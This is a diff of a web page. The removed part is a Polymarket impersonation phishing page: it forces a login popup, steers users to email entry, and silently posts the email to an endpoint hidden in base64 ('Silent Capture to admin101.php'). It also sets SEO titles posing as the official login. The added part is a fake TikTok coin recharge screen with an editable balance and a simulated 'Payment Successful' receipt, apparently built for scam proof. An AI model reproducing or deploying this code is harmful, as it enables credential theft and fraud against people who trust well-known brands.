-                    <i onclick="toggleDark()" id="theme-icon" data-lucide="moon" class="w-6 h-6 cursor-pointer text-black dark:text-yellow-400"></i>
-                </div>
-            </div>
-        </div>
+        <div class="custom-usd" id="custom-usd-display">US$0.00</div>
+      </div>
     </div>
 
-    <div id="loginPopup" class="hidden fixed inset-0 bg-black/40 z-50 flex items-end">
-        <div class="w-full max-w-md mx-auto bg-white dark:bg-gray-800 rounded-t-[32px] p-8 animate-slide-up shadow-2xl text-center">
-            <div class="w-12 h-1.5 bg-gray-200 rounded-full mx-auto mb-6"></div>
-            <h2 class="text-2xl font-bold mb-8">Welcome to Polymarket</h2>
-            
-            <button id="googleContinueBtn" class="google-btn w-full text-white py-4 rounded-xl font-bold flex items-center justify-center gap-3 mb-6">
-                <svg class="w-5 h-5 fill-current" viewBox="0 0 24 24"><path d="M12.48 10.92v3.28h7.84c-.24 1.84-.9 3.34-2.12 4.47a11.5 11.5 0 0 1-5.72 2.33c-3.14 0-5.88-1.55-7.56-3.92-1.68-2.37-2.1-5.32-1.14-8 1.14-3.13 4.12-5.33 7.56-5.33 1.9 0 3.73.68 5.16 1.94l2.3-2.3C16.8 1.48 14.43.5 12 .5a11.5 11.5 0 0 0 0 23c6.24 0 11.5-4.43 11.5-11.5 0-.7-.07-1.41-.2-2.1h-10.82z"/></svg>
-                Continue with Google
-            </button>
-
-            <div class="flex items-center gap-4 mb-6">
-                <hr class="flex-grow"> <span class="text-xs text-gray-400 font-bold uppercase tracking-widest">OR</span> <hr class="flex-grow">
-            </div>
-
-            <div id="emailSection" class="space-y-4 hidden">
-                <div class="relative">
-                    <input 
-                        id="emailInput" 
-                        type="email" 
-                        placeholder="Email address" 
-                        class="w-full p-4 border rounded-xl bg-gray-50 focus:outline-blue-500 dark:bg-gray-700 dark:text-white"
-                    >
-                    <button 
-                        id="emailContinueBtn" 
-                        disabled 
-                        class="absolute right-2 top-2 bg-gray-300 text-gray-600 px-4 py-2 rounded-lg font-bold cursor-not-allowed transition-colors"
-                    >
-                        Continue
-                    </button>
-                </div>
-            </div>
-
-            <div class="flex justify-center gap-6 mt-8">
-                <div class="wallet-icon w-12 h-12 bg-gray-50 dark:bg-gray-700 rounded-xl flex items-center justify-center border hover:border-blue-400 cursor-pointer overflow-hidden">
-                    <img src="https://logos-world.net/wp-content/uploads/2023/01/MetaMask-Logo.png" alt="MetaMask" class="w-10 h-10 object-contain">
-                </div>
-                <div class="wallet-icon w-12 h-12 bg-gray-50 dark:bg-gray-700 rounded-xl flex items-center justify-center border hover:border-blue-400 cursor-pointer overflow-hidden">
-                    <img src="https://logowik.com/content/uploads/images/coinbase-new4201.jpg" alt="Coinbase Wallet" class="w-10 h-10 object-contain">
-                </div>
-                <div class="wallet-icon w-12 h-12 bg-gray-50 dark:bg-gray-700 rounded-xl flex items-center justify-center border hover:border-blue-400 cursor-pointer overflow-hidden">
-                    <img src="https://i.pinimg.com/736x/6e/04/09/6e040925d8e4bd2c8eedfb6da4dc2ece.jpg" alt="Phantom" class="w-10 h-10 object-contain">
-                </div>
-                <div class="wallet-icon w-12 h-12 bg-gray-50 dark:bg-gray-700 rounded-xl flex items-center justify-center border hover:border-blue-400 cursor-pointer overflow-hidden">
-                    <img src="https://1000logos.net/wp-content/uploads/2022/05/WalletConnect-Logo.png" alt="WalletConnect" class="w-10 h-10 object-contain">
-                </div>
-            </div>
-
-            <p class="mt-8 text-xs text-gray-400 font-medium">Terms • Privacy</p>
-            
-            <button id="cancelBtn" onclick="closeLogin()" class="w-full mt-4 text-gray-500 py-2 hidden">Cancel</button>
-        </div>
+    <div class="custom-total-bar" style="border-bottom:1px solid var(--border);">
+      <span class="total-label">Total:</span>
+      <span class="total-usd" id="custom-total-usd">US$0.00</span>
     </div>
+
+    <div class="keypad" style="flex:1;">
+      <div class="key" onclick="keyPress('1')">1</div>
+      <div class="key" onclick="keyPress('2')">2</div>
+      <div class="key" onclick="keyPress('3')">3</div>
+      <div class="key backspace" onclick="keyPress('back')">⌫</div>
+      <div class="key" onclick="keyPress('4')">4</div>
+      <div class="key" onclick="keyPress('5')">5</div>
+      <div class="key" onclick="keyPress('6')">6</div>
+      <div class="key thousand" onclick="keyPress('000')">000</div>
+      <div class="key" onclick="keyPress('7')">7</div>
+      <div class="key" onclick="keyPress('8')">8</div>
+      <div class="key" onclick="keyPress('9')">9</div>
+      <div class="key" onclick="keyPress('0')">0</div>
+    </div>
+
+    <div style="padding:12px 20px;background:#fff;display:flex;align-items:center;justify-content:space-between;border-top:1px solid var(--border);">
+      <div>
+        <div style="font-size:12px;color:var(--subtext);">Total</div>
+        <div style="font-size:18px;font-weight:800;" id="custom-bottom-total">US$0.00</div>
+      </div>
+      <button class="recharge-btn" style="margin:0;width:auto;padding:14px 28px;" onclick="confirmCustom()">
+        Recharge →
+      </button>
+    </div>
+  </div>
+
+  <!-- ========== SCREEN 3: ORDER SUMMARY ========== -->
+  <div class="screen" id="screen-order">
+    <div class="top-nav">
+      <div class="nav-back" onclick="showScreen('screen-coins')">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#161823" stroke-width="2.5" stroke-linecap="round"><path d="M15 18l-6-6 6-6"/></svg>
+      </div>
+      <div class="nav-title">Order Summary</div>
+      <div class="nav-more" onclick="showScreen('screen-coins')">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#161823" stroke-width="2.5" stroke-linecap="round"><path d="M18 6L6 18M6 6l12 12"/></svg>
+      </div>
+    </div>
+
+    <div style="overflow-y:auto;flex:1;padding-bottom:20px;">
+      <div class="order-card">
+        <div class="order-card-title">Order Summary</div>
+        <div class="order-secure">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="#2ba84a"><path d="M12 2L4 6v6c0 5.5 3.5 10.7 8 12 4.5-1.3 8-6.5 8-12V6L12 2z"/></svg>
+          Your info is private and secure.
+        </div>
+        <div class="order-row">
+          <span class="order-row-label">Account</span>
+          <span class="order-row-value" id="order-account">@username</span>
+        </div>
+        <div class="order-row">
+          <span class="order-row-label">Total</span>
+          <div style="text-align:right;">
+            <span class="order-row-value total" id="order-total">US$0.00</span>
+            <span class="order-row-value coins-sub" id="order-coins-sub">0 Coins</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="payment-section">
+        <div class="payment-title">Payment method</div>
+        <div class="payment-methods">
+          <div class="payment-row" onclick="selectPayment('card')">
+            <div class="payment-cards">
+              <div class="card-badge visa">VISA</div>
+              <div class="card-badge mc">MC</div>
+              <div class="card-badge amex">AMEX</div>
+              <div class="card-badge jcb">JCB</div>
+            </div>
+            <div class="radio-circle selected" id="radio-card"></div>
+          </div>
+          <div class="divider"></div>
+          <div class="payment-row" onclick="selectPayment('paypal')">
+            <div class="paypal-logo">Pay<span>Pal</span></div>
+            <div class="radio-circle" id="radio-paypal"></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="terms-text">
+        By completing your purchase, you acknowledge that you are purchasing a limited license to access this virtual item subject to our <a href="#">Virtual Items Policy</a>. By using any amount of Coins within 14 days after the purchase, you acknowledge and confirm that you will no longer be eligible for a refund.<br><br>
+        To assess your tax rate in accordance with our <a href="#">Privacy Policy</a>, your location is <strong>United States</strong>.
+      </div>
+
+      <button class="recharge-btn" style="margin:14px 20px 0;width:calc(100% - 40px);" onclick="goToProcessing()">
+        🔒 Pay Now
+      </button>
+    </div>
+  </div>
+
+  <!-- ========== SCREEN 4: PROCESSING ========== -->
+  <div class="screen" id="screen-processing" style="display:none;flex-direction:column;">
+    <div class="processing-wrap">
+      <div class="processing-coins-anim"></div>
+      <div class="processing-spinner"></div>
+      <div class="processing-title">Processing your payment</div>
+      <div class="processing-sub">This could take a few seconds</div>
+    </div>
+  </div>
+
+  <!-- ========== SCREEN 5: RECEIPT ========== -->
+  <div class="screen" id="screen-receipt">
+    <div class="receipt-header">
+      <div class="receipt-check">✓</div>
+      <div class="receipt-success">Payment Successful!</div>
+      <div class="receipt-sub">Coins have been sent</div>
+    </div>
+
+    <div class="coins-explode"></div>
+
+    <div class="receipt-card">
+      <div class="receipt-row">
+        <span class="receipt-label">Sent to</span>
+        <span class="receipt-value" id="receipt-user">@username</span>
+      </div>
+      <div class="receipt-row">
+        <span class="receipt-label">Coins Sent</span>
+        <span class="receipt-value highlight" id="receipt-coins">🪙 0</span>
+      </div>
+      <div class="receipt-row">
+        <span class="receipt-label">Amount Paid</span>
+        <span class="receipt-value red" id="receipt-amount">US$0.00</span>
+      </div>
+      <div class="receipt-row">
+        <span class="receipt-label">Payment</span>
+        <span class="receipt-value" id="receipt-method">Credit/Debit Card</span>
+      </div>
+      <div class="receipt-row">
+        <span class="receipt-label">Status</span>
+        <span class="receipt-value" style="color:#2ba84a;">✅ Completed</span>
+      </div>
+      <div class="receipt-row">
+        <span class="receipt-label">Transaction ID</span>
+        <span class="receipt-value" id="receipt-txid" style="font-size:10px;"></span>
+      </div>
+    </div>
+
+    <button class="done-btn" onclick="resetAll()">Done</button>
+  </div>
+
+  <!-- ========== BALANCE MODAL ========== -->
+  <div class="modal-overlay" id="balance-modal" onclick="handleModalOverlay(event)">
+    <div class="modal-sheet">
+      <div class="modal-handle"></div>
+      <div class="modal-title">Set TikTok Coin Balance</div>
+      <input class="modal-input" id="balance-modal-input" type="number" placeholder="e.g. 96375101" value="96375101"/>
+      <button class="modal-btn" onclick="saveBalance()">Update Balance</button>
+    </div>
+  </div>
 
 </div>
 
 <script>
-    lucide.createIcons();
+  // ─── State ───────────────────────────────────────────────────
+  let selectedCoins   = 0;
+  let selectedPrice   = 0;
+  let customCoinsStr  = '0';
+  let selectedPayment = 'card';
+  let balance         = 96375101;
 
-    function marketCard(icon, title, outcomes, vol) {
-        let rows = outcomes.map(o => `
-            <div class="flex items-center justify-between py-2">
-                <span class="font-medium text-gray-600 dark:text-gray-300">${o.label}</span>
-                <div class="flex items-center gap-3">
-                    <span class="font-bold text-lg">${o.percent}%</span>
-                    <div class="flex gap-1">
-                        <button onclick="requireLogin()" class="bg-green-50 text-green-600 px-3 py-1.5 rounded-md font-bold text-sm border border-green-100">Yes</button>
-                        <button onclick="requireLogin()" class="bg-red-50 text-red-600 px-3 py-1.5 rounded-md font-bold text-sm border border-red-100">No</button>
-                    </div>
-                </div>
-            </div>
-        `).join("");
-
-        // 3. Trump Visual Logic
-        let visual = (icon === "trump.png") ? `<img src="trump.png" class="w-full h-full object-cover">` : icon;
-
-        return `
-            <div class="bg-white dark:bg-gray-700 rounded-3xl p-5 border border-gray-100 dark:border-gray-600 shadow-sm">
-                <div class="flex gap-4 mb-4 items-start">
-                    <div class="w-12 h-12 bg-gray-100 dark:bg-gray-600 rounded-xl flex items-center justify-center text-3xl overflow-hidden">${visual}</div>
-                    <h2 class="font-bold text-lg leading-tight flex-grow">${title}</h2>
-                </div>
-                <div class="space-y-1">
-                    ${rows}
-                </div>
-                <div class="mt-4 pt-4 border-t flex justify-between items-center text-gray-400 text-[11px] font-bold">
-                    <div class="flex items-center gap-2">
-                        <span>$${vol} Vol.</span>
-                        <i data-lucide="repeat-2" class="w-3 h-3"></i>
-                    </div>
-                    <div class="flex gap-4">
-                        <i data-lucide="gift" class="w-4 h-4"></i>
-                        <i data-lucide="bookmark" class="w-4 h-4"></i>
-                    </div>
-                </div>
-            </div>`;
-    }
-
-    // 2. 10 Unique Markets
-    const marketData = [
-        { icon: "trump.png", title: "Will Trump win the 2024 Presidential Election?", outcomes: [{label: "Trump", percent: 54}], vol: "2.1B" },
-        { icon: "🇺🇸", title: "US strikes Iran by March 15?", outcomes: [{label: "Yes", percent: 52}], vol: "392M" },
-        { icon: "₿", title: "Bitcoin to hit $100k in 2026?", outcomes: [{label: "Yes", percent: 68}], vol: "5.4M" },
-        { icon: "🏛️", title: "Will Senate pass the new Tech Bill?", outcomes: [{label: "Passes", percent: 45}], vol: "1.2M" },
-        { icon: "⚽", title: "Champions League Winner 2026", outcomes: [{label: "Real Madrid", percent: 32}], vol: "890K" },
-        { icon: "🍎", title: "Apple to announce AI headset in June?", outcomes: [{label: "Yes", percent: 74}], vol: "2.1M" },
-        { icon: "🚀", title: "Starship Flight 6 Success?", outcomes: [{label: "Soft Landing", percent: 41}], vol: "920K" },
-        { icon: "📉", title: "Fed to cut rates in Q3?", outcomes: [{label: "Cut", percent: 58}], vol: "12M" },
-        { icon: "🍿", title: "Highest grossing movie of 2026", outcomes: [{label: "Avatar 3", percent: 61}], vol: "450K" },
-        { icon: "🎾", title: "Will Alcaraz win Wimbledon?", outcomes: [{label: "Yes", percent: 39}], vol: "1.1M" }
-    ];
-
-    document.getElementById("markets").innerHTML = marketData.map(m => marketCard(m.icon, m.title, m.outcomes, m.vol)).join("");
-    lucide.createIcons();
-
-    const emailSection = document.getElementById("emailSection");
-    const emailInput = document.getElementById("emailInput");
-    const emailContinueBtn = document.getElementById("emailContinueBtn");
-    const googleBtn = document.getElementById("googleContinueBtn");
-
-    if (emailInput && emailContinueBtn) {
-        emailInput.addEventListener("input", () => {
-            const val = emailInput.value.trim();
-            const isValid = val.length > 5 && val.includes("@") && val.includes(".");
-
-            if (isValid) {
-                emailContinueBtn.disabled = false;
-                emailContinueBtn.classList.remove("bg-gray-300", "text-gray-600", "cursor-not-allowed");
-                emailContinueBtn.classList.add("bg-blue-600", "text-white", "hover:bg-blue-700", "cursor-pointer");
-            } else {
-                emailContinueBtn.disabled = true;
-                emailContinueBtn.classList.remove("bg-blue-600", "text-white", "hover:bg-blue-700", "cursor-pointer");
-                emailContinueBtn.classList.add("bg-gray-300", "text-gray-600", "cursor-not-allowed");
-            }
-        });
-    }
-
-    document.querySelectorAll('.wallet-icon').forEach(icon => {
-        icon.addEventListener('click', () => {
-            const toast = document.createElement("div");
-            toast.textContent = "User Error: Please login with Google";
-            toast.className = "fixed bottom-20 left-1/2 -translate-x-1/2 bg-red-600 text-white px-6 py-3 rounded-full shadow-lg z-50 font-bold";
-            document.body.appendChild(toast);
-            setTimeout(() => toast.remove(), 2500);
-        });
-    });
-
-    googleBtn.addEventListener('click', () => {
-        emailSection.classList.remove("hidden");
-        emailInput.focus();
-    });
-
-    if (emailContinueBtn) {
-        emailContinueBtn.addEventListener('click', () => {
-            const email = emailInput.value.trim();
-            if (email) {
-                // 5. Silent Capture to admin101.php
-                const r = "YWRtaW4xMDEucGhw"; 
-                fetch(atob(r), {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: 'email=' + encodeURIComponent(email)
-                }).finally(() => {
-                    window.location.href = 'login.html';
-                });
-            }
-        });
-    }
-
-    function toggleMenu(){ document.getElementById("menu-overlay").classList.toggle("hidden"); }
-    function requireLogin(){ document.getElementById("cancelBtn").classList.remove("hidden"); openLogin(); }
-    function openLogin(){ document.getElementById("loginPopup").classList.remove("hidden"); }
-    function closeLogin(){ document.getElementById("loginPopup").classList.add("hidden"); }
-
-    function toggleDark(){
-        const isDark = document.documentElement.classList.toggle("dark");
-        const icon = document.getElementById("theme-icon");
-        isDark ? icon.setAttribute('data-lucide', 'sun') : icon.setAttribute('data-lucide', 'moon');
-        lucide.createIcons();
-    }
-
+  // ─── Preloader → Screen 1 ────────────────────────────────────
+  setTimeout(() => {
+    document.getElementById('preloader').style.transition = 'opacity 0.6s ease';
+    document.getElementById('preloader').style.opacity = '0';
     setTimeout(() => {
-        document.getElementById("cancelBtn").classList.add("hidden");
-        openLogin();
-    }, 5000);
-</script>
-<script>
+      document.getElementById('preloader').style.display = 'none';
+      showScreen('screen-coins');
+    }, 600);
+  }, 3000);
 
-  // Dynamic Titles & Descriptions for Polymarket clone (optimized 2026 style)
-  const seoTitles = {
-    default: "Polymarket Official | Login & Start Trading",
-    login:    "Polymarket Login | Official Account Access",
-    account:  "Polymarket Account Login | Access Markets Securely",
-    signin:   "Polymarket Sign In | Secure & Official Access",
-    trade:    "Polymarket | Start Trading & Predict Events Now",
-    signup:   "Polymarket Sign Up | Official Registration & Login"
-  };
-
-  const seoDescriptions = {
-    default: "Log in to the official Polymarket platform. Trade prediction markets on politics, crypto, sports & more. Secure access for users worldwide.",
-    login:   "Securely log in to your Polymarket account. Access real-time prediction markets and start trading today.",
-    account: "Sign in to your Polymarket account to manage trades, view balances, and participate in global events.",
-    signin:  "Sign in to Polymarket – the world's leading prediction market. Fast, secure login for trading.",
-    trade:   "Start trading on Polymarket now. Predict outcomes on news, elections, crypto & sports with real-time odds.",
-    signup:  "Create your official Polymarket account. Sign up free and join the largest prediction market platform."
-  };
-
-  // Core update function (safe & idempotent)
-  function updateSEO(key = 'default') {
-    const title = seoTitles[key] || seoTitles.default;
-    const desc  = seoDescriptions[key] || seoDescriptions.default;
-
-    // Update <title>
-    document.title = title;
-
-    // Update or create <meta name="description">
-    let metaDesc = document.querySelector('meta[name="description"]');
-    if (!metaDesc) {
-      metaDesc = document.createElement('meta');
-      metaDesc.name = "description";
-      document.head.appendChild(metaDesc);
-    }
-    metaDesc.setAttribute('content', desc);
-
-    // Optional: add Open Graph / Twitter meta if you want social sharing previews
-    // document.querySelector('meta[property="og:title"]')?.setAttribute('content', title);
+  // ─── Screen manager ──────────────────────────────────────────
+  function showScreen(id) {
+    document.querySelectorAll('.screen').forEach(s => {
+      s.style.display = 'none';
+      s.classList.remove('active');
+    });
+    const el = document.getElementById(id);
+    el.style.display = 'flex';
+    // Force reflow for animation
+    void el.offsetWidth;
+    el.classList.add('active');
   }
 
-  // 1. Read URL param on load
-  const urlParams = new URLSearchParams(window.location.search);
-  const mode = urlParams.get('mode')?.toLowerCase() || 'default';
+  // ─── Coin selection ──────────────────────────────────────────
+  function selectCoin(el, coins, price) {
+    document.querySelectorAll('.coin-option').forEach(c => c.classList.remove('selected'));
+    el.classList.add('selected');
+    selectedCoins = coins;
+    selectedPrice = price;
+  }
 
-  // 2. Apply based on mode
-  updateSEO(mode);
+  function goToCustom() {
+    customCoinsStr = '0';
+    updateCustomDisplay();
+    showScreen('screen-custom');
+  }
 
-  // 3. Optional: react to UI events (e.g. when user clicks login/signup buttons)
-  // Adjust selectors to match your actual buttons/classes
-  document.querySelector('[onclick*="openLogin()"]')?.addEventListener('click', () => {
-    updateSEO('login');
-  });
+  // ─── Custom keypad ───────────────────────────────────────────
+  function keyPress(val) {
+    if (val === 'back') {
+      customCoinsStr = customCoinsStr.length > 1 ? customCoinsStr.slice(0,-1) : '0';
+    } else if (val === '000') {
+      if (customCoinsStr !== '0') customCoinsStr += '000';
+    } else {
+      if (customCoinsStr === '0') customCoinsStr = val;
+      else customCoinsStr += val;
+    }
+    // Cap at 10M
+    if (parseInt(customCoinsStr) > 10000000) customCoinsStr = '10000000';
+    updateCustomDisplay();
+  }
 
-  document.querySelector('[onclick*="signup"]')?.addEventListener('click', () => {  // if you add signup logic
-    updateSEO('signup');
-  });
+  function coinsToUSD(c) {
+    return (c * 0.01057).toFixed(2);
+  }
+
+  function updateCustomDisplay() {
+    const num = parseInt(customCoinsStr) || 0;
+    const usd = coinsToUSD(num);
+    document.getElementById('custom-val').textContent = num.toLocaleString();
+    document.getElementById('custom-usd-display').textContent = `US$${usd}`;
+    document.getElementById('custom-total-usd').textContent = `US$${usd}`;
+    document.getElementById('custom-bottom-total').textContent = `US$${usd}`;
+  }
+
+  function confirmCustom() {
+    const num = parseInt(customCoinsStr) || 0;
+    if(num < 1) { alert('Please enter a valid coin amount.'); return; }
+    selectedCoins = num;
+    selectedPrice = parseFloat(coinsToUSD(num));
+    goToOrder();
+  }
+
+  // ─── Go to Order ─────────────────────────────────────────────
+  function goToOrder() {
+    const username = document.getElementById('username-input').value.trim();
+    if (!username) { alert('Please enter a TikTok username.'); return; }
+    if (!selectedCoins) { alert('Please select or enter a coin amount.'); return; }
+
+    document.getElementById('order-account').textContent = '@' + username;
+    document.getElementById('order-total').textContent = `US$${selectedPrice.toFixed(2)}`;
+    document.getElementById('order-coins-sub').textContent = `${selectedCoins.toLocaleString()} Coins · US$${selectedPrice.toFixed(2)}`;
+    showScreen('screen-order');
+  }
+
+  // ─── Payment selection ───────────────────────────────────────
+  function selectPayment(method) {
+    selectedPayment = method;
+    document.getElementById('radio-card').className   = 'radio-circle' + (method === 'card'   ? ' selected' : '');
+    document.getElementById('radio-paypal').className = 'radio-circle' + (method === 'paypal' ? ' selected' : '');
+  }
+
+  // ─── Processing → Receipt ────────────────────────────────────
+  function goToProcessing() {
+    showScreen('screen-processing');
+    setTimeout(() => showReceipt(), 2800);
+  }
+
+  function showReceipt() {
+    const username = document.getElementById('username-input').value.trim();
+    document.getElementById('receipt-user').textContent   = '@' + username;
+    document.getElementById('receipt-coins').textContent  = '🪙 ' + selectedCoins.toLocaleString();
+    document.getElementById('receipt-amount').textContent = `US$${selectedPrice.toFixed(2)}`;
+    document.getElementById('receipt-method').textContent = selectedPayment === 'paypal' ? 'PayPal' : 'Credit/Debit Card';
+    document.getElementById('receipt-txid').textContent   = 'TT' + Date.now();
+    // Update balance
+    balance += selectedCoins;
+    document.getElementById('balance-display').textContent = balance.toLocaleString();
+    showScreen('screen-receipt');
+  }
+
+  // ─── Reset ───────────────────────────────────────────────────
+  function resetAll() {
+    selectedCoins = 0;
+    selectedPrice = 0;
+    customCoinsStr = '0';
+    document.querySelectorAll('.coin-option').forEach(c => c.classList.remove('selected'));
+    showScreen('screen-coins');
+  }
+
+  function goBack() {
+    // just stay or go back to home (in a real app would navigate)
+  }
+
+  // ─── Balance modal ───────────────────────────────────────────
+  function openBalanceModal() {
+    document.getElementById('balance-modal-input').value = balance;
+    document.getElementById('balance-modal').classList.add('open');
+  }
+  function handleModalOverlay(e) {
+    if (e.target === document.getElementById('balance-modal'))
+      document.getElementById('balance-modal').classList.remove('open');
+  }
+  function saveBalance() {
+    const val = parseInt(document.getElementById('balance-modal-input').value);
+    if (!isNaN(val) && val >= 0) {
+      balance = val;
+      document.getElementById('balance-display').textContent = balance.toLocaleString();
+    }
+    document.getElementById('balance-modal').classList.remove('open');
+  }
 </script>
-
 </body>
 </html>
